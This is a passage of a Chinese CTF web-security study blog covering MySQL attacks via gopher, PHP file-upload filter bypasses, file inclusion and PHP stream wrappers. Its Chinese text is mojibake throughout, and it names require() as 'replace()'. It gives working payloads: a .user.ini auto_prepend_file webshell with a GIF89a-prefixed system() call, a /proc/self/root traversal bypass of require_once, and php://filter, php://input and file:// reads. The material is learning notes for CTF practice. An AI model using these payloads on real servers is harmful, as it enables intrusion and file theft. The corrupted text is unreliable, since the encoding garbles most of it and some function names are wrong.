å½“æ— éœ€å¯†ç è®¤è¯æ—¶ç›´æ¥å‘é€TCP/IPæ•°æ®åŒ…å³å¯
</code></pre>
<p>è¿™å„¿å¯¹localhostå’Œ127.0.0.1åšä¸€ä¸ªåŒºåˆ«</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">localhostä¹Ÿå«local ï¼Œæ­£ç¡®çš„è§£é‡Šæ˜¯ï¼šæœ¬åœ°æœåŠ¡å™¨ã€‚</span><br><span class="line"><span class="number">127.0.0.1</span>çš„æ­£ç¡®è§£é‡Šæ˜¯ï¼šæœ¬æœºåœ°å€ï¼ˆæœ¬æœºæœåŠ¡å™¨ï¼‰ï¼Œå®ƒçš„è§£æé€šè¿‡æœ¬æœºçš„hostæ–‡ä»¶ï¼Œwindowsè‡ªåŠ¨å°†localhostè§£æä¸º<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>ã€‚</span><br><span class="line">localhotï¼ˆlocalï¼‰æ˜¯ä¸ç»ç½‘å¡ä¼ è¾“çš„ï¼Œè¿™ç‚¹å¾ˆé‡è¦ï¼Œå®ƒä¸å—ç½‘ç»œé˜²ç«å¢™å’Œç½‘å¡ç›¸å…³çš„çš„é™åˆ¶ã€‚<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>æ˜¯é€šè¿‡ç½‘å¡ä¼ è¾“ï¼Œä¾èµ–ç½‘å¡ï¼Œå¹¶å—åˆ°ç½‘ç»œé˜²ç«å¢™å’Œç½‘å¡ç›¸å…³çš„é™åˆ¶</span><br><span class="line">ç®€å•è¯´</span><br><span class="line">å½“æˆ‘ä»¬é€šè¿‡mysql -hlocalhost -unameå»è¿æ¥çš„æ—¶å€™ï¼Œæ²¡æœ‰ç»è¿‡ç½‘å¡ï¼Œä½¿ç”¨çš„æ˜¯unixå¥—æ¥å­—è¿æ¥ï¼Œè¿™ç§æ—¶å€™æˆ‘ä»¬tcpdumpæ˜¯æŠ“ä¸åˆ°åŒ…çš„</span><br><span class="line">å½“æˆ‘ä»¬éœ€è¦æŠ“å–mysqlé€šä¿¡æ•°æ®åŒ…æ—¶å¿…é¡»ä½¿ç”¨TCP/IPå¥—æ¥å­—è¿æ¥ã€‚</span><br><span class="line">mysql -h <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> -uname</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å¹³å¸¸æ‰“mysqlæœ€å¸¸ç”¨çš„å°±æ˜¯æ‰“æ— å¯†ç çš„mysql</p>
<p>ä½†æ˜¯æˆ‘ä»¬åœ¨ç”¨gopherè¿˜æ˜¯éœ€è¦ç”¨dictåè®®å»å¾—åˆ°mysqlçš„ç«¯å£(é»˜è®¤æ˜¯3306)</p>
<p>ç›´æ¥ä½¿ç”¨çš„gopheruså·¥å…·,ç›´æ¥å¿«é€Ÿç”Ÿæˆpayload<br><img src="/2022/05/28/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></p>
<hr>
<h3 id="å…­ã€æ–‡ä»¶ä¸Šä¼ "><a href="#å…­ã€æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å…­ã€æ–‡ä»¶ä¸Šä¼ "></a>å…­ã€æ–‡ä»¶ä¸Šä¼ </h3><h4 id="1-å¤šé‡è¿‡æ»¤ç»•è¿‡"><a href="#1-å¤šé‡è¿‡æ»¤ç»•è¿‡" class="headerlink" title="1.å¤šé‡è¿‡æ»¤ç»•è¿‡"></a>1.å¤šé‡è¿‡æ»¤ç»•è¿‡</h4><p><u><strong>ä¸‹é¢æ˜¯ä»¥æ”»é˜²ä¸–ç•Œçš„ä¸€é“easyuploadçš„wpè®²è§£ä¸€äº›æƒ…å½¢çš„ç»•è¿‡æ–¹å¼</strong></u></p>
<p>è¿™é‡Œéœ€è¦ç»•è¿‡çš„ç‚¹å¦‚ä¸‹</p>
<ul>
<li>æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰phpå­—ç¬¦ä¸²</li>
<li>æ£€æŸ¥åç¼€ä¸­æ˜¯å¦æœ‰htaccessæˆ–ph</li>
<li>æ£€æŸ¥æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯</li>
<li>æ–‡ä»¶MIMEç±»å‹</li>
</ul>
<p>å¯¹äº<u>ç¬¬ä¸€ç‚¹</u>å¯ä»¥åˆ©ç”¨<strong>çŸ­æ ‡ç­¾</strong>ç»•è¿‡ï¼Œä¾‹å¦‚ <?=phpinfo();?></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">æŠŠshort_open_tag å­—æ®µæ”¹ä¸ºOnï¼Œå°±å¯ä»¥å®ç°çŸ­æ ‡ç­¾åŠŸèƒ½</span><br><span class="line"></span><br><span class="line">çŸ­æ ‡ç­¾ï¼š</span><br><span class="line"><span class="number">1</span>.èƒ½æ­£å¸¸è§£æç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.ä½¿ç”¨<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>çš„å½¢å¼è¾“å‡ºï¼Œåœ¨çŸ­æ ‡ç­¾çœ‹æ¥ï¼Œ<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br><span class="line">å°±ç›¸å½“äº</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">æ­£ç¡®ï¼š</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">æŠ¥é”™ï¼š</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä»è¿™ä¸ªå¯¹æ¯”è¯•éªŒæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼š</span><br><span class="line">åœ¨çŸ­æ ‡ç­¾æ¨¡å¼ä¸‹ï¼Œ</span><br><span class="line">æˆ‘ä»¬æ‰§è¡Œphpè¯­å¥phpå‡½æ•°ï¼Œéƒ½ç”¨ç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">ä½†æ˜¯æˆ‘ä»¬è¦è¾“å‡ºä¸€ä¸ªflagï¼Œæˆ–è€…å˜é‡æ—¶ï¼Œä½¿ç”¨<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>çš„å½¢å¼è¾“å‡º</span><br></pre></td></tr></table></figure></div>

<p>å¯¹äº<u>ç¬¬äºŒç‚¹</u>å¯ä»¥é€šè¿‡ä¸Šä¼ **.user.ini**ä»¥åŠæ­£å¸¸jpgæ–‡ä»¶æ¥è¿›è¡Œgetshell,å¯ä»¥å‚è€ƒä»¥ä¸‹æ–‡ç« </p>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">æ–‡ç« </a></p>
<p><strong>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</strong></p>
<p> <strong>è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</strong></p>
<p> <strong>å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</strong></p>
<p><u>ç¬¬ä¸‰ç‚¹</u>ç»•è¿‡æ–¹å¼å³åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ªå›¾ç‰‡çš„<strong>æ–‡ä»¶å¤´</strong>ï¼Œæ¯”å¦‚<code>GIF89a</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">JPG</span> ï¼šFF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF</span>(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PNG</span>ï¼š <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span></span><br></pre></td></tr></table></figure></div>

<p><u>ç¬¬å››ç‚¹</u>ç»•è¿‡æ–¹æ³•å³ä¿®æ”¹ä¸Šä¼ æ—¶çš„Content-Type</p>
<p>å› æ­¤æœ€ç»ˆçš„payloadä¸ºï¼š<br> ä¸Šä¼ .user.iniï¼Œå†…å®¹ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_fileã€<span class="built_in">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class="built_in">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šä¼ a.jpgï¼Œå†…å®¹ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="2-æ–‡ä»¶ç±»å‹"><a href="#2-æ–‡ä»¶ç±»å‹" class="headerlink" title="2.æ–‡ä»¶ç±»å‹"></a>2.æ–‡ä»¶ç±»å‹</h4><p><img src="https://img-blog.csdnimg.cn/20200226180218842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFqaWF3ZWk=,size_16,color_FFFFFF,t_70" alt="img"></p>
<hr>
<h3 id="ä¸ƒã€æ–‡ä»¶åŒ…å«"><a href="#ä¸ƒã€æ–‡ä»¶åŒ…å«" class="headerlink" title="ä¸ƒã€æ–‡ä»¶åŒ…å«"></a>ä¸ƒã€æ–‡ä»¶åŒ…å«</h3><h4 id="1-æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š"><a href="#1-æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š" class="headerlink" title="1.æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š"></a>1.æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š</h4><p>1.include():å°†åœ¨å…¶è¢«è°ƒç”¨çš„ä½ç½®å¤„åŒ…å«ä¸€ä¸ªæ–‡ä»¶ã€‚åŒ…å«ä¸€ä¸ªæ–‡ä»¶ä¸åœ¨è¯¥è¯­å¥æ‰€åœ¨ä½ç½®å¤åˆ¶åˆ¶å®šæ–‡ä»¶çš„æ•°æ®å…·æœ‰ç›¸åŒå†…å®¹çš„æ•ˆæœã€‚ä½¿ç”¨include()æ—¶å¯ä»¥å¿½ç•¥æ‹¬å·ã€‚</p>
<p>2.include_once():åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ include() è¯­å¥ç±»ä¼¼ï¼Œ<u><strong>å”¯ä¸€åŒºåˆ«æ˜¯include_once()ä¼šå…ˆåˆ¤æ–­ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨ä¹‹å‰æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚å·²ç»åŒ…å«ï¼Œåˆ™å¿½ç•¥æœ¬æ¬¡åŒ…å«ã€‚</strong></u></p>
<p>3.replace() :å¾ˆå¤§ç¨‹åº¦ä¸Šä¸includeç›¸åŒï¼Œéƒ½æ˜¯å°†ä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶åŒ…å«åˆ°requireè°ƒç”¨ååœ¨çš„ä½ç½®ã€‚</p>
<p>requireå’Œincludeä¹‹é—´æœ‰ä¸¤ç‚¹é‡è¦çš„åŒºåˆ«:</p>
<p>1.æ— è®ºrequireçš„ä½ç½®å¦‚ä½•ï¼Œåˆ¶å®šæ–‡ä»¶éƒ½å°†åŒ…å«åˆ°å‡ºç°requireçš„è„šæœ¬ä¸­ã€‚ä¾‹å¦‚ï¼Œå³ä½¿requireæ”¾åœ¨è®¡ç®—ç»“æœä¸ºå‡çš„ifè¯­å¥ä¸­ï¼Œä¾ç„¶ä¼šåŒ…å«æŒ‡å®šæ–‡ä»¶ã€‚<br>2.requireå‡ºé”™æ—¶ï¼Œè„šæœ¬å°†åœæ­¢è¿è¡Œï¼Œè€Œåœ¨ä½¿ç”¨includeçš„æƒ…å†µä¸‹ï¼Œè„šæœ¬å°†ç»§ç»­æ‰§è¡Œã€‚</p>
<p>4.replace_once():åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ require() è¯­å¥ç±»ä¼¼ï¼Œ<u><strong>å”¯ä¸€åŒºåˆ«æ˜¯require_once()ä¼šå…ˆåˆ¤æ–­ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨ä¹‹å‰æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚å·²ç»åŒ…å«ï¼Œåˆ™å¿½ç•¥æœ¬æ¬¡åŒ…å«</strong></u></p>
<p><u><strong>ä¸‹é¢æ˜¯ä¸€ç¯‡å…³äºrequire_onceè¢«ä½¿ç”¨åä¸èƒ½å†ä½¿ç”¨æ€ä¹ˆç»•å¼€çš„æ–‡ç« ï¼Œæœ¬äººåœ¨2022å¹´5æœˆæ ¡å†…Dest0g3äºŒæ¬¡æ‹›æ–°æ¯”èµ›é‡åˆ°ç±»ä¼¼ï¼Œç‰¹æ­¤è®°å½•</strong></u></p>
<p><a href="https://www.anquanke.com/post/id/213235">phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶</a></p>
<p>ä¸‹é¢ä¸ºè¯¥é¢˜ä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">//find something in flag1.php </span></span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$d</span>, FILTER_VALIDATE_URL)) &#123;   </span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$d</span>);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;lai&quot;</span>) !== <span class="literal">false</span> &amp;&amp;</span><br><span class="line">  <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;ya&quot;</span>) !== <span class="literal">false</span>)  &#123;       </span><br><span class="line">            @<span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you can not pass&quot;</span>);     </span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/labour$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line">                  @<span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$d</span>);       </span><br><span class="line">                  <span class="keyword">echo</span> (<span class="variable">$a</span>);     </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;                                      <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);     </span><br><span class="line">                                    &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;why?&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p><strong>æ–‡ç« å…³é”®ï¼š</strong></p>
<p><u><strong>phpçš„æ–‡ä»¶åŒ…å«æœºåˆ¶æ˜¯å°†å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­ï¼Œå½“å·²ç»<code>require_once(&#39;flag.php&#39;)</code>ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†require_onceã€‚</strong></u></p>
<p><u><strong>ä»Šå¤©å°±æ¥è°ˆè°ˆï¼Œæ€ä¹ˆè®¾æƒ³å¦‚ä½•ç»•è¿‡è¿™ä¸ªå“ˆå¸Œè¡¨ï¼Œè®©phpè®¤ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶åä¸åœ¨å“ˆå¸Œè¡¨ä¸­ï¼Œåˆå¯ä»¥è®©phpèƒ½æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œè¯»å–åˆ°å†…å®¹ã€‚</strong></u></p>
<p><u><strong>åœ¨è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹ï¼Œ<code>/proc/self</code>æŒ‡å‘å½“å‰è¿›ç¨‹çš„<code>/proc/pid/</code>ï¼Œ<code>/proc/self/root/</code>æ˜¯æŒ‡å‘<code>/</code>çš„ç¬¦å·é“¾æ¥ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡</strong></u></p>
<p>payload:</p>
<p>?d=0://labour/../../../../../flll1ag2.txt&amp;ctf=laiya</p>
<h4 id="2-phpä¼ªåè®®ï¼š"><a href="#2-phpä¼ªåè®®ï¼š" class="headerlink" title="2.phpä¼ªåè®®ï¼š"></a>2.phpä¼ªåè®®ï¼š</h4><p>å†…å®¹æ¥è‡ªäº<a href="https://blog.csdn.net/qz362228/article/details/124359070">https://blog.csdn.net/qz362228/article/details/124359070</a></p>
<p><img src="https://img-blog.csdnimg.cn/92c9df98952f41669db5d8b8b2ffaead.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h5 id="1-php-åè®®"><a href="#1-php-åè®®" class="headerlink" title="1.php://åè®®"></a>1.php://åè®®</h5><p>â€‹    <strong>Â·æ¡ä»¶ï¼š</strong></p>
<p><code>allow_url_fopen:off/on</code><br><code>allow_url_include</code> :ä»…<code>php://input</code> <code>php://stdin</code> <code>php://memory</code> <code>php://temp</code> éœ€è¦<code>on</code></p>
<p><strong>Â·ä½œç”¨ï¼š</strong></p>
<p><code>php://</code> è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code>ï¼Œ<code>php://filter</code>ç”¨äº<strong>è¯»å–æºç </strong>ï¼Œ<code>php://input</code>ç”¨äº<strong>æ‰§è¡Œphpä»£ç </strong>ã€‚</p>
<p>  <strong>Â·è¯´æ˜</strong>ï¼š</p>
<p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ<br>å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p>
<h5 id="2-php-filterä¼ªåè®®"><a href="#2-php-filterä¼ªåè®®" class="headerlink" title="2.php://filterä¼ªåè®®"></a>2.php://filterä¼ªåè®®</h5><p>   <strong>Â·æ¡ä»¶</strong></p>
<p><code>allow_url_fopen=on/off</code><br><code>allow_url_include=on/off</code></p>
<p>åªæ˜¯<code>è¯»å–</code>ï¼Œéœ€è¦å¼€å¯ allow_url_fopenï¼Œä¸éœ€è¦å¼€å¯ allow_url_include</p>
<p>â€‹    <strong>Â·è¯´æ˜ï¼š</strong><br>å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€æ•°æ®æµæ‰“å¼€â€æ—¶çš„â€ç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™<br>â‘ è¾“å‡ºè¿›è¡Œ<code>base64</code>åŠ å¯†åçš„ä¿¡æ¯</p>
<p><code>?file=php://filter/convert.base64-encode/resource=xx.php</code><br><code>æˆ–</code><br><code>?file=php://filter/read=convert.base64-encode/resource=xx.php</code></p>
<p>â‘¡è·å¾—å°†base64åŠ å¯†åçš„ä¿¡æ¯åï¼Œå†å°†å…¶è§£å¯†ï¼Œå¾—å‡ºåŸä¿¡æ¯</p>
<h5 id="3-php-inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰"><a href="#3-php-inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰" class="headerlink" title="3.php://inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰"></a>3.php://inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰</h5><p>   <strong>Â·æ¡ä»¶</strong></p>
<p><code>allow_url_fopen=on/off</code><br><code>allow_url_include=on</code></p>
<p>   <strong>Â·è¯´æ˜</strong><br>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚åœ¨postè¯·æ±‚ä¸­èƒ½æŸ¥çœ‹è¯·æ±‚çš„åŸå§‹æ•°æ®ï¼Œ<u><strong>å¹¶å°†postè¯·æ±‚ä¸­çš„postæ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œ</strong></u>ã€‚ï¼ˆåªè¯»æµæ˜¯è¯´åªèƒ½è¿›è¡Œè¯»æ“ä½œçš„æ•°æ®ï¼‰</p>
<p><code>ä¾‹å¦‚</code></p>
<p>ä¸‹é¢çš„POSTæ•°æ®é‡Œçš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œ</p>
<p><img src="/2022/05/28/Web-study/image-20220801143739625.png" alt="image-20220801143739625"></p>
<p>å³å¯ä»¥<u>ç›´æ¥è¯»å–åˆ°POSTä¸Š</u>æ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®ã€‚ <strong>enctype=â€multipart/form-dataâ€</strong> çš„æ—¶å€™ php://input æ˜¯<strong>æ— æ•ˆ</strong>çš„</p>
<p><code>æ³¨</code> ï¼šæŸ¥çœ‹å½“å‰è¿è¡Œçš„æ˜¯å“ªä¸ªphp.ini<br>2,3éœ€è¦å°†phpå¯æ‰§è¡ŒåŠ å…¥ç¯å¢ƒå˜é‡, å¦‚æœæ²¡æœ‰åŠ ,é‚£ä¹ˆè¯·ä½¿ç”¨phpå¯æ‰§è¡Œæ–‡ä»¶æ‰€åœ¨ä½ç½®çš„å®Œæ•´è·¯å¾„ä»£æ›¿</p>
<p>1.æ‰“å°å‡ºphpinfo();ï¼Œæ‰¾åˆ°Loaded Configuration Fileé‚£ä¸€è¡Œ</p>
<p><img src="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png" alt="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png"></p>
<p>2.å‘½ä»¤è¡Œè¾“å…¥<code>php -i |grep php.ini</code>ï¼ˆ<code>php -i</code>å…¶å®å°±æ˜¯è¾“å‡ºphpinfo();)</p>
<p>3.<code>php -r â€œphpinfo();â€ |grep php.ini</code></p>
<h5 id="4-file-ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰"><a href="#4-file-ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰" class="headerlink" title="4.file://ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰"></a>4.file://ä¼ªåè®®ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰</h5><p>   <strong>Â·æ¡ä»¶</strong></p>
<p><code>allow_url_fopen=on/off</code><br><code>allow_url_include=on/off</code> ï¼ˆå‡ä¸å—å½±å“ï¼‰</p>
<p>æ‰“ctfä¸­å¸¸ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶</p>
<p><code>?file=file://C:\Windows\System32\drivers\etc\hosts</code></p>
